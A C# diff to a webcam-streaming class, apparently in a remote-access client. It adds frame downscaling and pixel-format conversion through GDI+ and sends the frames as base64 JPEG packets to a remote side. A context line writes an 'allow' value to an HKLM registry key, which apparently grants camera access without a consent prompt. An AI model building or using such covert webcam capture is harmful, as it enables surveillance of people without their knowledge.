@@ -519,16 +519,38 @@ internal static class WebcamFeature
                     byte[]? raw = System.Threading.Interlocked.Exchange(ref _sgCbFrame, null);
                     if (raw == null || raw.Length == 0) continue;
 
-                    byte[]? jpeg = sgIsMjpg ? raw
-                        : sgIsYuy2 ? Yuy2ToJpeg(raw, vidW, vidH, _cfg.Quality)
-                        : bpp == 4 ? Bgrx32ToJpeg(raw, vidW, vidH, _cfg.Quality)
-                        : Rgb24ToJpeg(raw, vidW, vidH, _cfg.Quality);
+                    // Determine effective dimensions for this frame
+                    int outW = vidW, outH = vidH;
+                    int maxH = _cfg.MaxHeight;
+                    if (maxH > 0 && vidH > maxH)
+                    {
+                        outH = maxH;
+                        outW = (int)((double)vidW / vidH * maxH);
+                        if (outW < 1) outW = 1;
+                    }
+
+                    byte[]? jpeg;
+                    if (outW != vidW || outH != vidH)
+                    {
+                        // Downscale: convert raw → full-size GDI+ bitmap, then scale and encode
+                        jpeg = sgIsMjpg ? ScaleMjpeg(raw, outW, outH, _cfg.Quality)
+                            : sgIsYuy2 ? ScaleAndEncode(Yuy2ToBgra(raw, vidW, vidH), vidW, vidH, outW, outH, _cfg.Quality)
+                            : bpp == 4 ? ScaleAndEncode(Bgrx32ToBgra(raw, vidW, vidH), vidW, vidH, outW, outH, _cfg.Quality)
+                            : ScaleAndEncode(Rgb24ToBgra(raw, vidW, vidH), vidW, vidH, outW, outH, _cfg.Quality);
+                    }
+                    else
+                    {
+                        jpeg = sgIsMjpg ? raw
+                            : sgIsYuy2 ? Yuy2ToJpeg(raw, vidW, vidH, _cfg.Quality)
+                            : bpp == 4 ? Bgrx32ToJpeg(raw, vidW, vidH, _cfg.Quality)
+                            : Rgb24ToJpeg(raw, vidW, vidH, _cfg.Quality);
+                    }
 
                     if (jpeg == null || jpeg.Length == 0) continue;
 
                     lastSendMs = now;
                     var b64  = RemoteDesktopFeature.ToBase64(jpeg);
-                    var json = "{\"w\":" + vidW + ",\"h\":" + vidH + ",\"j\":\"" + b64 + "\"}";
+                    var json = "{\"w\":" + outW + ",\"h\":" + outH + ",\"j\":\"" + b64 + "\"}";
                     _send?.Invoke((int)PacketType.WcamFrame, json)
                          .ContinueWith(_ => { }, System.Threading.Tasks.TaskContinuationOptions.None);
                 }
@@ -706,6 +728,155 @@ internal static class WebcamFeature
             { RegSetValueExW(hkLm2, "Value", 0, REG_SZ, allow, (uint)allow.Length); RegCloseKey(hkLm2); }
         }
     }
+
+    // ── Downscaling helpers ────────────────────────────────────────────────────
+
+    [DllImport("gdiplus.dll")]
+    private static extern int GdipGetImageGraphicsContext(IntPtr image, out IntPtr graphics);
+    [DllImport("gdiplus.dll")]
+    private static extern int GdipDrawImageRectI(IntPtr graphics, IntPtr image, int x, int y, int w, int h);
+    [DllImport("gdiplus.dll")]
+    private static extern int GdipDeleteGraphics(IntPtr graphics);
+    [DllImport("gdiplus.dll")]
+    private static extern int GdipSetInterpolationMode(IntPtr graphics, int mode);
+
+    private static byte[] Yuy2ToBgra(byte[] raw, int w, int h)
+    {
+        int stride = w * 4;
+        var bgra = new byte[stride * h];
+        int yuyStride = w * 2;
+        for (int row = 0; row < h; row++)
+        {
+            for (int col = 0; col < w; col++)
+            {
+                int yuyBase = row * yuyStride + (col & ~1) * 2;
+                byte Y = raw[row * yuyStride + col * 2];
+                byte U = yuyBase + 1 < raw.Length ? raw[yuyBase + 1] : (byte)128;
+                byte V = yuyBase + 3 < raw.Length ? raw[yuyBase + 3] : (byte)128;
+                int C = Y - 16, D = U - 128, E = V - 128;
+                int dst = row * stride + col * 4;
+                bgra[dst]     = (byte)Clamp255((298 * C + 516 * D           + 128) >> 8);
+                bgra[dst + 1] = (byte)Clamp255((298 * C - 100 * D - 208 * E + 128) >> 8);
+                bgra[dst + 2] = (byte)Clamp255((298 * C           + 409 * E + 128) >> 8);
+                bgra[dst + 3] = 255;
+            }
+        }
+        return bgra;
+    }
+
+    private static byte[] Bgrx32ToBgra(byte[] bgrx, int w, int h)
+    {
+        int stride = w * 4;
+        var bgra = new byte[stride * h];
+        for (int row = 0; row < h; row++)
+        {
+            int src = (h - 1 - row) * stride;
+            int dst = row * stride;
+            Buffer.BlockCopy(bgrx, src, bgra, dst, stride);
+            for (int col = 0; col < w; col++) bgra[dst + col * 4 + 3] = 255;
+        }
+        return bgra;
+    }
+
+    private static byte[] Rgb24ToBgra(byte[] rgb, int w, int h)
+    {
+        int bgraStride = w * 4;
+        int srcStride  = w * 3;
+        var bgra = new byte[bgraStride * h];
+        for (int row = 0; row < h; row++)
+        {
+            int srcRow = h - 1 - row;
+            for (int col = 0; col < w; col++)
+            {
+                int s = srcRow * srcStride + col * 3;
+                int d = row   * bgraStride + col * 4;
+                if (s + 2 >= rgb.Length) break;
+                bgra[d] = rgb[s]; bgra[d+1] = rgb[s+1]; bgra[d+2] = rgb[s+2]; bgra[d+3] = 255;
+            }
+        }
+        return bgra;
+    }
+
+    private static unsafe byte[]? ScaleAndEncode(byte[] bgra, int srcW, int srcH, int dstW, int dstH, int quality)
+    {
+        RemoteDesktopFeature.EnsureGdiplusPublic();
+        IntPtr srcBmp = IntPtr.Zero, dstBmp = IntPtr.Zero, gfx = IntPtr.Zero;
+        try
+        {
+            fixed (byte* p = bgra)
+            {
+                if (GdipCreateBitmapFromScan0(srcW, srcH, srcW * 4, 0x26200A, (IntPtr)p, out srcBmp) != 0 || srcBmp == IntPtr.Zero)
+                    return null;
+            }
+            if (GdipCreateBitmapFromScan0(dstW, dstH, 0, 0x26200A, IntPtr.Zero, out dstBmp) != 0 || dstBmp == IntPtr.Zero)
+                return null;
+            if (GdipGetImageGraphicsContext(dstBmp, out gfx) != 0 || gfx == IntPtr.Zero)
+                return null;
+            GdipSetInterpolationMode(gfx, 2); // Bilinear
+            GdipDrawImageRectI(gfx, srcBmp, 0, 0, dstW, dstH);
+            GdipDeleteGraphics(gfx); gfx = IntPtr.Zero;
+            return RemoteDesktopFeature.GdipBitmapToJpeg(dstBmp, quality);
+        }
+        catch { return null; }
+        finally
+        {
+            if (gfx    != IntPtr.Zero) GdipDeleteGraphics(gfx);
+            if (dstBmp  != IntPtr.Zero) GdipDisposeImage(dstBmp);
+            if (srcBmp  != IntPtr.Zero) GdipDisposeImage(srcBmp);
+        }
+    }
+
+    private static byte[]? ScaleMjpeg(byte[] jpegData, int dstW, int dstH, int quality)
+    {
+        // For MJPEG, decode the JPEG first, scale, then re-encode
+        // Use GDI+ to load from memory
+        RemoteDesktopFeature.EnsureGdiplusPublic();
+        IntPtr srcBmp = IntPtr.Zero;
+        try
+        {
+            // Create GDI+ image from JPEG bytes via IStream
+            unsafe
+            {
+                fixed (byte* p = jpegData)
+                {
+                    var hGlobal = Marshal.AllocHGlobal(jpegData.Length);
+                    Marshal.Copy(jpegData, 0, hGlobal, jpegData.Length);
+                    CreateStreamOnHGlobal(hGlobal, true, out IntPtr pStream);
+                    if (pStream == IntPtr.Zero) { Marshal.FreeHGlobal(hGlobal); return jpegData; }
+                    GdipCreateBitmapFromStream(pStream, out srcBmp);
+                    Marshal.Release(pStream);
+                    if (srcBmp == IntPtr.Zero) return jpegData;
+                }
+            }
+            IntPtr dstBmp = IntPtr.Zero, gfx = IntPtr.Zero;
+            try
+            {
+                if (GdipCreateBitmapFromScan0(dstW, dstH, 0, 0x26200A, IntPtr.Zero, out dstBmp) != 0 || dstBmp == IntPtr.Zero)
+                    return jpegData;
+                if (GdipGetImageGraphicsContext(dstBmp, out gfx) != 0 || gfx == IntPtr.Zero)
+                    return jpegData;
+                GdipSetInterpolationMode(gfx, 2);
+                GdipDrawImageRectI(gfx, srcBmp, 0, 0, dstW, dstH);
+                GdipDeleteGraphics(gfx); gfx = IntPtr.Zero;
+                return RemoteDesktopFeature.GdipBitmapToJpeg(dstBmp, quality);
+            }
+            finally
+            {
+                if (gfx    != IntPtr.Zero) GdipDeleteGraphics(gfx);
+                if (dstBmp  != IntPtr.Zero) GdipDisposeImage(dstBmp);
+            }
+        }
+        catch { return jpegData; }
+        finally
+        {
+            if (srcBmp != IntPtr.Zero) GdipDisposeImage(srcBmp);
+        }
+    }
+
+    [DllImport("ole32.dll")]
+    private static extern int CreateStreamOnHGlobal(IntPtr hGlobal, bool fDeleteOnRelease, out IntPtr ppstm);
+    [DllImport("gdiplus.dll")]
+    private static extern int GdipCreateBitmapFromStream(IntPtr stream, out IntPtr bitmap);
 
     private static string EscapeJson(string s)
         => s.Replace("\\", "\\\\").Replace("\"", "\\\"");
